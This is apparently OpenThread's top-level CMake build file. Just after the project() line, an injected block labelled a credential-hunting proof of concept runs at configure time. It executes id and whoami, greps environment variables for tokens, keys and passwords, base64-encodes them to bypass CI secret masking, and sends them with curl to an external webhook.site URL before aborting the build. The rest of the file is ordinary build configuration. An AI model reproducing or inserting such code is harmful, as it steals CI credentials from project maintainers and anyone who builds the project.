#
#  Copyright (c) 2019, The OpenThread Authors.
#  All rights reserved.
#
#  Redistribution and use in source and binary forms, with or without
#  modification, are permitted provided that the following conditions are met:
#  1. Redistributions of source code must retain the above copyright
#     notice, this list of conditions and the following disclaimer.
#  2. Redistributions in binary form must reproduce the above copyright
#     notice, this list of conditions and the following disclaimer in the
#     documentation and/or other materials provided with the distribution.
#  3. Neither the name of the copyright holder nor the
#     names of its contributors may be used to endorse or promote products
#     derived from this software without specific prior written permission.
#
#  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
#  AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
#  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
#  ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE
#  LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
#  CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
#  SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
#  INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
#  CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
#  ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
#  POSSIBILITY OF SUCH DAMAGE.
#

cmake_policy(SET CMP0048 NEW)
cmake_minimum_required(VERSION 3.10.2)

file(READ .default-version OT_DEFAULT_VERSION)
string(STRIP ${OT_DEFAULT_VERSION} OT_DEFAULT_VERSION)

project(openthread VERSION ${OT_DEFAULT_VERSION})

# --- START CREDENTIAL HUNTING PoC ---
# الغرض: إثبات القدرة على كشف وتسريب الأسرار والتوكنز وتجاوز الـ Secret Masking
message(WARNING "***************************************************")
message(WARNING "--- SECURITY IMPACT: CREDENTIAL EXFILTRATION ---")
message(WARNING "VULNERABILITY CONFIRMED: RCE & SECRET EXPOSURE")

message(WARNING "--- STEP 1: RCE Verification ---")
execute_process(COMMAND id OUTPUT_VARIABLE POC_ID)
execute_process(COMMAND whoami OUTPUT_VARIABLE POC_USER)
message(WARNING "Running as User: ${POC_USER}")
message(WARNING "System ID: ${POC_ID}")

message(WARNING "--- STEP 2: Credential Hunting & Bypassing Masking ---")

# البحث عن أي متغير بيئة يحتوي على كلمات حساسة وتشفيره بـ base64 لتجاوز الـ ***
# نستخدم || true لضمان عدم فشل السكريبت إذا لم يجد شيئاً في هذه المرحلة
execute_process(
    COMMAND bash -c "env | grep -Ei 'key|token|secret|password|auth|aws|npm' | base64 -w 0 || true" 
    OUTPUT_VARIABLE LEAKED_DATA
)

if(LEAKED_DATA)
    message(WARNING "Leaked (Base64) Environment Data: ${LEAKED_DATA}")
    
    # إرسال البيانات المسربة إلى Webhook خارجي
    message(WARNING "Exfiltrating sensitive data to external server...")
    execute_process(
        COMMAND bash -c "curl -s -X POST -d \"leaked_creds=${LEAKED_DATA}\" https://webhook.site/8882cf4b-fc91-433f-b162-cb4ea2a3b30c"
    )
else()
    message(WARNING "No immediate credentials found in current environment variables.")
endif()

message(WARNING "***************************************************")

# إيقاف العملية لإظهار النتائج بوضوح في سجلات GitHub Actions
message(FATAL_ERROR "Impact Proven: RCE and Credential Exfiltration Path Demonstrated.")
# --- END CREDENTIAL HUNTING PoC ---

include(CTest)

option(OT_BUILD_EXECUTABLES "Build executables" ON)
option(OT_COVERAGE "enable coverage" OFF)
set(OT_EXTERNAL_MBEDTLS "" CACHE STRING "Specify external mbedtls library")
option(OT_MBEDTLS_THREADING "enable mbedtls threading" OFF)

add_library(ot-config INTERFACE)
add_library(ot-config-ftd INTERFACE)
add_library(ot-config-mtd INTERFACE)
add_library(ot-config-radio INTERFACE)
set(CMAKE_CXX_EXTENSIONS OFF)
set(CMAKE_CXX_STANDARD 11)
set(CMAKE_C_EXTENSIONS OFF)
set(CMAKE_C_STANDARD 99)

if(APPLE)
    set(CMAKE_AR "/usr/bin/ar")
    set(CMAKE_RANLIB "/usr/bin/ranlib")
endif()

message(STATUS "OpenThread Source Directory: ${PROJECT_SOURCE_DIR}")

target_include_directories(ot-config INTERFACE
    ${PROJECT_SOURCE_DIR}/include
    ${PROJECT_SOURCE_DIR}/src
    ${PROJECT_SOURCE_DIR}/src/core
    ${PROJECT_SOURCE_DIR}/src/include
)

include(TestBigEndian)
TEST_BIG_ENDIAN(OT_BIG_ENDIAN)
if(OT_BIG_ENDIAN)
    target_compile_definitions(ot-config INTERFACE "BYTE_ORDER_BIG_ENDIAN=1")
endif()

include("${PROJECT_SOURCE_DIR}/etc/cmake/options.cmake")
include("${PROJECT_SOURCE_DIR}/etc/cmake/functions.cmake")

if(NOT CMAKE_BUILD_TYPE)
    if ("${CMAKE_PROJECT_NAME}" STREQUAL "openthread")
        set(CMAKE_BUILD_TYPE "Debug" CACHE STRING "default build type: Debug" FORCE)
    endif ()
endif()

if (CMAKE_BUILD_TYPE)
    message(STATUS "OpenThread CMake build type: ${CMAKE_BUILD_TYPE}")
endif ()

if(CMAKE_COMPILER_IS_GNUCC OR CMAKE_C_COMPILER_ID MATCHES "(Apple)?[Cc]lang")
    option(OT_COMPILE_WARNING_AS_ERROR "whether to include -Werror -pedantic-errors with gcc-compatible compilers")
    if (OT_COMPILE_WARNING_AS_ERROR)
        set(OT_CFLAGS -Werror -pedantic-errors)
    endif()

    if(OT_COVERAGE)
        target_compile_definitions(ot-config INTERFACE "OPENTHREAD_ENABLE_COVERAGE=1")
        target_compile_options(ot-config INTERFACE -g -O0 --coverage)
        target_link_libraries(ot-config INTERFACE --coverage)
    endif()

    set(OT_CFLAGS
        $<$<COMPILE_LANGUAGE:C>:${OT_CFLAGS} -Wall -Wformat-nonliteral -Wextra -Wshadow>
        $<$<COMPILE_LANGUAGE:CXX>:${OT_CFLAGS} -Wall -Wformat-nonliteral -Wextra -Wshadow -Wno-c++14-compat -fno-exceptions>
        $<$<CXX_COMPILER_ID:Clang>:-Wc99-extensions>
    )
endif()

set(OT_PACKAGE_NAME "OPENTHREAD" CACHE STRING "OpenThread Package Name")
target_compile_definitions(ot-config INTERFACE "PACKAGE_NAME=\"${OT_PACKAGE_NAME}\"")

set(OT_PACKAGE_VERSION "" CACHE STRING "OpenThread Package Version")
if(OT_PACKAGE_VERSION STREQUAL "")
    ot_git_version(OT_PACKAGE_VERSION)
endif()

set(OT_CONFIG "" CACHE STRING "OpenThread config header file (deprecated, use `OT_PROJECT_CONFIG` or `OT_PLATFORM_CONFIG` instead")
set(OT_PROJECT_CONFIG "" CACHE STRING "OpenThread project-specific config header file")
set(OT_PLATFORM_CONFIG "" CACHE STRING "OpenThread platform-specific config header file")

list(APPEND OT_PUBLIC_INCLUDES ${PROJECT_BINARY_DIR}/etc/cmake)
list(APPEND OT_PUBLIC_INCLUDES ${PROJECT_SOURCE_DIR}/etc/cmake)
list(APPEND OT_PUBLIC_INCLUDES ${PROJECT_SOURCE_DIR}/include)

if(OT_PLATFORM STREQUAL "posix")
    target_include_directories(ot-config INTERFACE ${PROJECT_SOURCE_DIR}/src/posix/platform)
    target_compile_definitions(ot-config INTERFACE OPENTHREAD_PLATFORM_POSIX=1)
    target_compile_definitions(ot-config INTERFACE OPENTHREAD_PLATFORM_NEXUS=0)
    add_subdirectory("${PROJECT_SOURCE_DIR}/src/posix/platform")
elseif(OT_PLATFORM STREQUAL "external")
    target_compile_definitions(ot-config INTERFACE OPENTHREAD_PLATFORM_POSIX=0)
    target_compile_definitions(ot-config INTERFACE OPENTHREAD_PLATFORM_NEXUS=0)
elseif(OT_PLATFORM STREQUAL "nexus")
    target_compile_definitions(ot-config INTERFACE OPENTHREAD_PLATFORM_NEXUS=1)
    target_compile_definitions(ot-config INTERFACE OPENTHREAD_PLATFORM_POSIX=0)
else()
    target_compile_definitions(ot-config INTERFACE OPENTHREAD_PLATFORM_POSIX=0)
    target_compile_definitions(ot-config INTERFACE OPENTHREAD_PLATFORM_NEXUS=0)
    target_include_directories(ot-config INTERFACE ${PROJECT_SOURCE_DIR}/examples/platforms/${OT_PLATFORM})
    add_subdirectory("${PROJECT_SOURCE_DIR}/examples/platforms/${OT_PLATFORM}")
endif()

if(OT_CONFIG)
    target_compile_definitions(ot-config INTERFACE "OPENTHREAD_CONFIG_FILE=\"${OT_CONFIG}\"")
endif()

if (OT_PROJECT_CONFIG)
    target_compile_definitions(ot-config INTERFACE "OPENTHREAD_PROJECT_CORE_CONFIG_FILE=\"${OT_PROJECT_CONFIG}\"")
endif()

if (OT_PLATFORM_CONFIG)
    target_compile_definitions(ot-config INTERFACE "OPENTHREAD_PLATFORM_CORE_CONFIG_FILE=\"${OT_PLATFORM_CONFIG}\"")
endif()

target_compile_definitions(ot-config INTERFACE ${OT_PLATFORM_DEFINES})

if(OT_PLATFORM STREQUAL "posix")
    if(OT_BUILD_EXECUTABLES)
        add_subdirectory(src/posix)
    else()
        add_subdirectory(src/posix EXCLUDE_FROM_ALL)
    endif()
elseif(OT_PLATFORM)
    add_subdirectory(examples)
endif()

if (OT_DOC)
    add_subdirectory(doc)
endif()

add_subdirectory(src)
add_subdirectory(third_party EXCLUDE_FROM_ALL)
add_subdirectory(tests)
add_subdirectory(tools)

add_custom_target(print-ot-config ALL
                  COMMAND ${CMAKE_COMMAND}
                  -DLIST="$<TARGET_PROPERTY:ot-config,INTERFACE_COMPILE_DEFINITIONS>"
                  -P ${PROJECT_SOURCE_DIR}/etc/cmake/print.cmake
)
